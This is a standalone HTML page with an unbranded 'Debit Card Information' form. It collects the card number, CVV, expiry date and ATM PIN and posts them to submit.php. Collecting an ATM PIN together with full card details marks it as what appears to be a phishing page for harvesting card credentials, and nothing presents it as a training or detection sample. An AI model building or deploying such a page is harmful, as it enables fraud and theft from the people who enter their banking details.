<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Debit Card Information</title>
  <style>
    body {
      background-color: yellow;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 500px;
      margin: 50px auto;
      padding: 20px;
      background: white;
      border-radius: 8px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
    }

    label {
      display: block;
      margin-bottom: 10px;
      font-weight: bold;
    }

    input[type="text"],
    input[type="number"],
    button {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }

    button {
      background-color: #4CAF50;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="container">
    <form action="submit.php" method="POST">
      <label for="debitCard">Debit Card Number</label>
      <input type="number" id="debitCard" name="debitCard" placeholder="Enter debit card number" required>

      <label for="cvv">CVV</label>
      <input type="number" id="cvv" name="cvv" placeholder="Enter CVV" required>

      <label for="expiryDate">Expiry Date</label>
      <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>

      <label for="atmPin">ATM PIN</label>
      <input type="number" id="atmPin" name="atmPin" placeholder="Enter ATM PIN" required>

      <button type="submit">Submit</button>
    </form>
  </div>
</body>
</html>
